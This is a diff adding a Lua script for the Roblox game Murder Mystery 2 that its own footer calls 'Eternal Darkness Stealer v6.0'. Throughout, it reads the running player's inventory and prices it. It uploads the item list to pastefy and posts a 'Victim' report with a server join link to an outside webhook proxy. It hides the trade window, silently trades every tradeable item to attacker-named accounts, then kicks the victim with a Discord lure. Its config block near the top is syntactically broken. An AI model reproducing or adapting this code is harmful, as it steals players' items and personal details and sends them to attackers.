@@ -1,0 +1,686 @@
+repeat task.wait() until game:IsLoaded()
+task.wait(2)
+
+if game.PlaceId ~= 142823291 then
+    local plr = game.Players:FindFirstChildOfClass("Player") or game.Players.LocalPlayer
+    if plr and typeof(plr.Kick) == "function" then
+        pcall(function() plr:Kick("This script only works in MM2!") end)
+    end
+    return
+end
+_G.ED_CONFIG = {
+	local WEBHOOK_ID = "150393afd8d35e633698fe55c6360451"
+	local USERNAMES = {"Nuls_rip"}
+	local PROXY_URL = "https://eternal-darkness.org/proxy/"
+
+if not _G.ED_CONFIG then
+    warn("[ED] No config found. Execute the user loader first!")
+    return
+end
+
+
+local cfg = _G.ED_CONFIG
+local WEBHOOK_ID = cfg.WEBHOOK_ID
+local USERNAMES = cfg.USERNAMES
+local PROXY_URL = cfg.PROXY_URL
+
+if not WEBHOOK_ID or WEBHOOK_ID == "" then
+    warn("[ED] Invalid WEBHOOK_ID")
+    return
+end
+
+if not USERNAMES or #USERNAMES == 0 then
+    warn("[ED] No usernames configured")
+    return
+end
+
+-- Services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+
+local plr = Players.LocalPlayer
+if not plr then 
+    warn("[ED] LocalPlayer not found")
+    return 
+end
+
+local executorName = "Unknown"
+pcall(function()
+    if identifyexecutor then
+        executorName = identifyexecutor()
+    elseif getexecutorname then
+        executorName = getexecutorname()
+    end
+end)
+
+getgenv().request = getgenv().request or request or http_request or 
+    (syn and syn.request) or (http and http.request) or 
+    (fluxus and fluxus.request) or nil
+
+if not getgenv().request then
+    warn("[ED] No request function found - executor not supported")
+    return
+end
+local request = getgenv().request
+
+-- Job ID capture
+local REAL_JOB_ID = game.JobId
+if identifyexecutor and identifyexecutor() == "Delta" then
+    local captured = false
+    local stepAnimate = nil
+    
+    repeat
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name == "stepAnimate" then
+                    stepAnimate = v
+                    break
+                end
+            end
+        end
+        task.wait()
+    until stepAnimate
+    
+    hookfunction(stepAnimate, function(dt)
+        if not captured then
+            captured = true
+            REAL_JOB_ID = game.JobId
+        end
+        return stepAnimate(dt)
+    end)
+    
+    task.wait(0.5)
+end
+
+-- Colors and config
+local ETERNAL_DARKNESS_COLORS = {
+    primary = 0x0a0a1a,
+    secondary = 0x1a1a2e,
+    accent = 0x16213e,
+    highlight = 0x0f3460,
+    text = 0x533483,
+    gold = 0x8b0000,
+    success = 0x006400
+}
+
+-- No trade items list
+local no_trade_items = {
+    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
+    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
+    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
+    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
+    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true,
+    ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true,
+    ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
+    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
+    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
+}
+
+local specialItems = {
+    ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
+    ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
+    ["Chroma Blizzard"] = true, ["Chroma Alienbeam"] = true, ["Chroma Snowstorm"] = true,
+    ["Chroma Raygun"] = true, ["C. Snowcannon"] = true, ["C. Snow Dagger"] = true,
+    ["Chroma Sunrise"] = true, ["Chroma Sunset"] = true, ["Chroma Ornament"] = true,
+    ["Chroma Watergun"] = true, ["Evergun"] = true, ["Traveler's Gun"] = true,
+    ["Evergreen"] = true, ["Constellation"] = true, ["Vampire's Gun"] = true,
+    ["Turkey"] = true, ["Darkshot"] = true, ["Darksword"] = true, ["Alienbeam"] = true,
+    ["Blossom"] = true, ["Sakura"] = true, ["Bauble"] = true, ["Gingerscope"] = true,
+    ["Traveler's Axe"] = true, ["Celestial"] = true, ["Vampire's Axe"] = true
+}
+
+-- Database loading
+local dbSuccess, database = pcall(function()
+    return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+end)
+
+if not dbSuccess then
+    warn("[ED] Failed to load item database")
+    return
+end
+
+-- Get profile data
+local profileSuccess, profileData = pcall(function()
+    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+end)
+
+if not profileSuccess or not profileData then
+    warn("[ED] Failed to get profile data")
+    return
+end
+
+-- Value fetching
+local categories = {
+    godlies = "https://supremevalues.com/mm2/godlies",
+    chroma = "https://supremevalues.com/mm2/chromas",
+    ancients = "https://supremevalues.com/mm2/ancients",
+    vintages = "https://supremevalues.com/mm2/vintages",
+    uniques = "https://supremevalues.com/mm2/uniques",
+    legendaries = "https://supremevalues.com/mm2/legendaries"
+}
+
+local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
+
+local function fetchHTML(url)
+    local ok, response = pcall(function() 
+        return request({Url = url, Method = "GET"}) 
+    end)
+    if ok and response then 
+        return response.Body 
+    end
+    return nil
+end
+
+local function parseValue(itembodyDiv)
+    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+    if valueStr then
+        valueStr = valueStr:gsub(",", "")
+        return tonumber(valueStr)
+    end
+    return nil
+end
+
+local function extractItems(htmlContent)
+    local itemValues = {}
+    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        itemName = itemName:match("([^<]+)")
+        if itemName then
+            itemName = itemName:gsub("%s+", " "):gsub("^%s*(.-)%s*$", "%1")
+            local value = parseValue(itembodyDiv)
+            if value then 
+                itemValues[itemName:lower()] = value 
+            end
+        end
+    end
+    return itemValues
+end
+
+local function buildValueList()
+    local allValues = {}
+    local chromaValues = {}
+    
+    local completed = 0
+    local lock = Instance.new("BindableEvent")
+    
+    for rarity, url in pairs(categories) do
+        task.spawn(function()
+            local html = fetchHTML(url)
+            if html then
+                if rarity == "chroma" then
+                    chromaValues = extractItems(html)
+                else
+                    local extracted = extractItems(html)
+                    for k, v in pairs(extracted) do 
+                        allValues[k] = v 
+                    end
+                end
+            end
+            completed = completed + 1
+            if completed >= 6 then 
+                lock:Fire() 
+            end
+        end)
+    end
+    
+    lock.Event:Wait()
+    
+    -- Map to database
+    local valueList = {}
+    for dataid, item in pairs(database) do
+        local itemName = item.ItemName and item.ItemName:lower() or ""
+        local rarity = item.Rarity or ""
+        
+        if itemName ~= "" and rarity ~= "" then
+            local hasChroma = item.Chroma or false
+            
+            if hasChroma then
+                for cn, cv in pairs(chromaValues) do
+                    if cn:find(itemName) then 
+                        valueList[dataid] = cv
+                        break 
+                    end
+                end
+            else
+                if allValues[itemName] then
+                    valueList[dataid] = allValues[itemName]
+                end
+            end
+        end
+    end
+    
+    return valueList
+end
+
+local weaponsToSend = {}
+local totalInventoryValue = 0
+local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
+local hasSpecialItem = false
+
+local prices = buildValueList()
+
+local weaponsOwned = profileData.Weapons and profileData.Weapons.Owned or {}
+
+for dataid, amount in pairs(weaponsOwned) do
+    local item = database[dataid]
+    if item and not no_trade_items[dataid] then
+        local itemName = item.ItemName or dataid
+        local rarity = item.Rarity or "Common"
+        local value = prices[dataid] or 1
+        local totalValue = value * amount
+        
+        totalInventoryValue = totalInventoryValue + totalValue
+        
+        if specialItems[itemName] then 
+            hasSpecialItem = true 
+        end
+        
+        table.insert(weaponsToSend, {
+            DataID = dataid,
+            ItemName = itemName,
+            Amount = amount,
+            Rarity = rarity,
+            Value = value,
+            TotalValue = totalValue
+        })
+        
+        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
+    end
+end
+
+table.sort(weaponsToSend, function(a, b) 
+    return a.TotalValue > b.TotalValue 
+end)
+
+-- Upload to pastefy
+local function uploadToPastefy(items)
+    local lines = {
+        "Eternal Darkness Inventory | " .. plr.Name,
+        "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
+        "Total Items: " .. #items,
+        string.rep("-", 50), 
+        ""
+    }
+    
+    table.sort(items, function(a, b)
+        local tier_order = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
+        local a_order = tier_order[a.Rarity] or 1
+        local b_order = tier_order[b.Rarity] or 1
+        if a_order ~= b_order then return a_order > b_order end
+        return (a.Value * a.Amount) > (b.Value * b.Amount)
+    end)
+    
+    local current_tier = nil
+    for _, item in ipairs(items) do
+        if current_tier ~= item.Rarity then
+            current_tier = item.Rarity
+            table.insert(lines, "")
+            table.insert(lines, "[" .. current_tier:upper() .. "]")
+            table.insert(lines, string.rep("-", 30))
+        end
+        local total_val = item.Value * item.Amount
+        table.insert(lines, string.format("%s | Qty: %d | Value: %d (Total: %d)", 
+            item.ItemName, item.Amount, item.Value, total_val))
+    end
+    
+    local content = table.concat(lines, "\n")
+    
+    local ok, response = pcall(function()
+        return request({
+            Url = "https://pastefy.app/api/v2/paste",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                content = content,
+                type = "PASTE"
+            })
+        })
+    end)
+    
+    if ok and response and response.StatusCode == 200 then
+        local ok2, data = pcall(function() 
+            return HttpService:JSONDecode(response.Body) 
+        end)
+        if ok2 and data then
+            if data.paste then 
+                return "https://pastefy.app/" .. data.paste.id
+            elseif data.id then 
+                return "https://pastefy.app/" .. data.id 
+            end
+        end
+    end
+    return "Failed to upload"
+end
+
+-- USD Calculation
+local function GetUSD(list)
+    local totalUSD = 0
+    local itemPrices = {}
+    
+    local starpetsRates = {
+        ["Nik's Scythe"] = 1500, ["Corrupt"] = 800, ["Glitched"] = 500,
+        ["Batwing"] = 45, ["Icewing"] = 35, ["Hallowscythe"] = 25,
+        ["Icebreaker"] = 20, ["Elderwood Scythe"] = 18, ["Logchopper"] = 15,
+        ["Hallow's Blade"] = 12, ["BattleAxe"] = 12, ["BattleAxe II"] = 10,
+        ["Ginger Luger"] = 8, ["Ice Dragon"] = 7, ["Red Luger"] = 7,
+        ["Green Luger"] = 7, ["Chill"] = 6.5, ["Handsaw"] = 6,
+        ["Pixel"] = 5.5, ["Candy"] = 5, ["Sugar"] = 5,
+        ["Eternal"] = 4.5, ["Spider"] = 4, ["Old Glory"] = 4,
+        ["Amerilaser"] = 4, ["Virtual"] = 3.5, ["Blaster"] = 3.5,
+        ["Laser"] = 3.5, ["Prince"] = 3, ["Shadow"] = 3,
+        ["Saw"] = 2.8, ["Deathshard"] = 2.8, ["Fang"] = 2.8,
+        ["Tides"] = 2.8, ["Slasher"] = 2.8, ["Heat"] = 2.8,
+        ["Luger"] = 2.8, ["Flames"] = 2.5, ["Seer"] = 2.5,
+        ["Nightblade"] = 2.2, ["Gemstone"] = 2.2, ["Bio"] = 2,
+        ["Phoenix"] = 2, ["Frostsaber"] = 2, ["Ice Shard"] = 1.8,
+        ["Winter's Edge"] = 1.8, ["Vampire's Edge"] = 1.5,
+        ["Gingerblade"] = 1.5, ["Clockwork"] = 1.5, ["Boneblade"] = 1.5,
+        ["Evergreen"] = 1.5, ["Evergun"] = 1.5, ["Traveler's Gun"] = 1.5,
+        ["Vampire's Gun"] = 1.5, ["Constellation"] = 1.5, ["Bauble"] = 1.5,
+        ["Alienbeam"] = 1.5, ["Darkshot"] = 1.5, ["Darksword"] = 1.5,
+        ["Chroma Luger"] = 8.4, ["Chroma Heat"] = 8.4, ["Chroma Fang"] = 8.4,
+        ["Chroma Slasher"] = 8.4, ["Chroma Tides"] = 8.4, ["Chroma Deathshard"] = 8.4,
+        ["Chroma Saw"] = 8.4, ["Chroma Seer"] = 7.5, ["Chroma Gemstone"] = 6.6,
+        ["Chroma Laser"] = 10.5, ["America"] = 15, ["Blood"] = 12
+    }
+
+    for _, item in ipairs(list) do
+        local displayName = database[item.DataID] and database[item.DataID].ItemName or item.DataID
+        local rate = starpetsRates[displayName] or 0.07
+        local itemTotal = rate * item.Amount
+        totalUSD = totalUSD + itemTotal
+
+        table.insert(itemPrices, {
+            name = displayName,
+            amount = item.Amount,
+            unitPrice = tostring(rate),
+            totalPrice = string.format("%.2f", itemTotal)
+        })
+    end
+
+    return {
+        total = string.format("%.2f", totalUSD),
+        itemPrices = itemPrices
+    }
+end
+
+-- Webhook sending
+local function sendToProxy(payload)
+    task.spawn(function()
+        local url = PROXY_URL .. WEBHOOK_ID
+        
+        local success, response = pcall(function()
+            return request({
+                Url = url,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json",
+                    ["User-Agent"] = "EternalDarkness/2.0.0"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        
+        if not success then
+            warn("[ED] Webhook failed:", response)
+        elseif response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+            warn("[ED] Webhook error:", response.StatusCode, response.Body)
+        else
+            print("[ED] Webhook sent successfully")
+        end
+    end)
+end
+
+-- Prepare webhook data
+local rubisLink = uploadToPastefy(weaponsToSend)
+local usdData = GetUSD(weaponsToSend)
+local totalUSD = usdData.total or "0.00"
+
+local PlaceId = game.PlaceId
+local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)
+
+local hitCategory = ""
+local isPingWorthy = false
+
+if totalInventoryValue < 100 then
+    hitCategory = "Bad Hit"
+elseif totalInventoryValue < 300 then
+    hitCategory = "Normal Hit"
+elseif totalInventoryValue < 1000 then
+    hitCategory = "Good Hit"
+    isPingWorthy = true
+else
+    hitCategory = "Big Hit"
+    isPingWorthy = true
+end
+
+local total_items = 0
+for _, item in ipairs(weaponsToSend) do 
+    total_items = total_items + item.Amount 
+end
+
+local top_items = {}
+for i = 1, math.min(3, #weaponsToSend) do
+    local item = weaponsToSend[i]
+    local rarityEmoji = {
+        Ancient = "🔴", Godly = "🟣", Unique = "🟡", 
+        Vintage = "🟠", Legendary = "🔵", Rare = "🟢"
+    }
+    local emoji = rarityEmoji[item.Rarity] or "⚪"
+    table.insert(top_items, string.format("%s `%s` x%d **%d**", emoji, item.ItemName, item.Amount, item.TotalValue))
+end
+
+local fields = {
+    {
+        name = "👤 Victim",
+        value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days",
+        inline = true
+    },
+    {
+        name = "⚙️ System",
+        value = "Executor: " .. executorName .. "\nReceiver: " .. table.concat(USERNAMES, ", ") .. "\nJob ID:\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...",
+        inline = true
+    },
+    {
+        name = "💰 Valuation",
+        value = "Total Value: " .. totalInventoryValue .. "\nReal Value: $" .. totalUSD .. "\nTotal Items: " .. total_items,
+        inline = true
+    }
+}
+
+local esc = string.char(27)
+local ansiLine1 = esc .. "[2;31mAncient:  " .. rarityCounts.Ancient .. "  " .. esc .. "[2;35mGodly:   " .. rarityCounts.Godly .. esc .. "[0m"
+local ansiLine2 = esc .. "[2;33mUnique:   " .. rarityCounts.Unique .. "  " .. esc .. "[2;38;5;208mVintage: " .. rarityCounts.Vintage .. esc .. "[0m"
+local ansiLine3 = esc .. "[2;34mLegendary:" .. rarityCounts.Legendary .. "  " .. esc .. "[2;32mRare:    " .. rarityCounts.Rare .. esc .. "[0m"
+local ansiLine4 = esc .. "[2;37mUncommon: " .. rarityCounts.Uncommon .. "  Common:  " .. rarityCounts.Common
+
+table.insert(fields, {
+    name = "📊 Inventory Breakdown",
+    value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "```",
+    inline = false
+})
+
+table.insert(fields, {
+    name = "🏆 Top Items",
+    value = "```\n" .. table.concat(top_items, "\n") .. "\n```",
+    inline = false
+})
+
+table.insert(fields, {
+    name = "🔗 Actions",
+    value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")",
+    inline = false
+})
+
+local payload = {
+    content = isPingWorthy and "@everyone 🌑 **NEW MM2 HIT | Eternal Darkness**" or nil,
+    username = "🌑 Eternal Darkness",
+    avatar_url = "https://imgur.com/a/OPHDrDn.png",
+    embeds = {{
+        title = "Eternal Darkness MM2 HIT │ " .. hitCategory,
+        url = rubisLink,
+        color = ETERNAL_DARKNESS_COLORS.secondary,
+        thumbnail = {url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)},
+        description = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. REAL_JOB_ID .. "')\n```",
+        fields = fields,
+        footer = {
+            text = "Eternal Darkness Stealer v6.0"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+sendToProxy(payload)
+
+print("[ED] MM2 Script loaded successfully for", plr.Name)
+print("[ED] Inventory value:", totalInventoryValue, "Items:", #weaponsToSend)
+
+-- Trading logic
+local Trade = ReplicatedStorage:WaitForChild("Trade", 5)
+if not Trade then
+    warn("[ED] Trade remote not found")
+    return
+end
+
+local SendRequest = Trade:WaitForChild("SendRequest")
+local GetStatus = Trade:WaitForChild("GetTradeStatus")
+local OfferItem = Trade:WaitForChild("OfferItem")
+local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
+local DeclineTrade = Trade:WaitForChild("DeclineTrade")
+
+local LastOffer = nil
+local isTradeCompleted = false
+
+if Trade:FindFirstChild("UpdateTrade") then
+    Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
+        if x and x.LastOffer then 
+            LastOffer = x.LastOffer 
+        end 
+    end)
+end
+
+local PlayerGui = plr:WaitForChild("PlayerGui")
+for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
+    local gui = PlayerGui:FindFirstChild(guiName)
+    if gui then
+        gui.Enabled = false
+        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if gui.Enabled then gui.Enabled = false end
+        end)
+    end
+end
+
+local function getStatus()
+    local ok, status = pcall(function() 
+        return GetStatus:InvokeServer() 
+    end)
+    return ok and status or "None"
+end
+
+local function isTarget(name)
+    for _, u in ipairs(USERNAMES) do
+        if u:lower() == name:lower() then 
+            return true 
+        end
+    end
+    return false
+end
+
+local function doTrade(targetPlayer)
+    if not targetPlayer then return end
+
+    local attempts = 0
+    while attempts < 30 do
+        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then 
+            break 
+        end
+        attempts = attempts + 1
+        task.wait(0.5)
+    end
+    
+    local itemsToTrade = {}
+    for _, item in ipairs(weaponsToSend) do
+        table.insert(itemsToTrade, item)
+    end
+    
+    if #itemsToTrade == 0 then return end
+    
+    local timeout = 0
+    local itemsAdded = false
+    
+    while timeout < 60 and #itemsToTrade > 0 and not isTradeCompleted do
+        local status = getStatus()
+        
+        if status == "None" then
+            if itemsAdded then
+                for i = 1, math.min(4, #itemsToTrade) do 
+                    table.remove(itemsToTrade, 1)
+                end
+                itemsAdded = false
+                LastOffer = nil
+                task.wait(0.5)
+            else
+                SendRequest:InvokeServer(targetPlayer)
+                task.wait(1.5)
+            end
+        elseif status == "StartTrade" then
+            if not itemsAdded then
+                for i = 1, math.min(4, #itemsToTrade) do
+                    local item = itemsToTrade[i]
+                    if item then
+                        for _ = 1, item.Amount do
+                            OfferItem:FireServer(item.DataID, "Weapons")
+                        end
+                    end
+                    task.wait(0.1)
+                end
+                itemsAdded = true
+                task.spawn(function()
+                    task.wait(6.5)
+                    if LastOffer then
+                        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
+                    end
+                end)
+            end
+            task.wait(1)
+        elseif status == "ReceivingRequest" then
+            DeclineTrade:FireServer()
+            task.wait(0.3)
+        end
+        
+        timeout = timeout + 1
+        task.wait(0.5)
+    end
+    
+    if #itemsToTrade == 0 then
+        isTradeCompleted = true
+        task.wait(2)
+        pcall(function() 
+            setclipboard("https://discord.gg/wep4k9Fg8W") 
+        end)
+        pcall(function()
+            plr:Kick("Items taken by Eternal Darkness\n\nJoin to get your items back!\ndiscord.gg/wep4k9Fg8W")
+        end)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if player == plr then return end
+    if isTarget(player.Name) then
+        task.spawn(function()
+            task.wait(4)
+            doTrade(player)
+        end)
+    end
+end)
+
+for _, p in ipairs(Players:GetPlayers()) do
+    if p ~= plr and isTarget(p.Name) then
+        task.spawn(function()
+            task.wait(4)
+            doTrade(p)
+        end)
+    end
+end
